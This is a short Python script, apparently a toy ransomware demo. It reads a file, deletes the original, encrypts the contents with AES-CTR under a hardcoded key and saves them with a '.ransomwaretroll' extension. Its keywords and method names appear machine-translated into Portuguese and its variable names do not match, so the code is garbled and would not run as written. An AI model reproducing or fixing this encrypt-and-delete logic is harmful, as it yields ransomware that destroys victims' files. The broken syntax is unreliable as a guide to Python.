import  os
importar  pyaes

## abrir o arquivo a ser criptografado
file_name  =  "teste.txt"
file  =  open ( file_name , "rb" )
arquivo_dados  =  arquivo . leia ()
arquivo . fechar ()

## removedor de arquivo
os . remover ( nome_do_arquivo )

## chave de criptografia
key  =  b"testeransomwares"
aes  =  pyaes . AESModeOfOperationCTR ( chave )

## criptografar o arquivo
crypto_data  =  aes . criptografar ( arquivo_dados )

## salvar o arquivo criptografado
new_file  =  file_name  +  ".ransomwaretroll"
novo_arquivo  =  aberto ( f' { novo_arquivo } ' , 'wb' )
novo_arquivo . escrever ( cripto_dados )
novo_arquivo . fechar ()
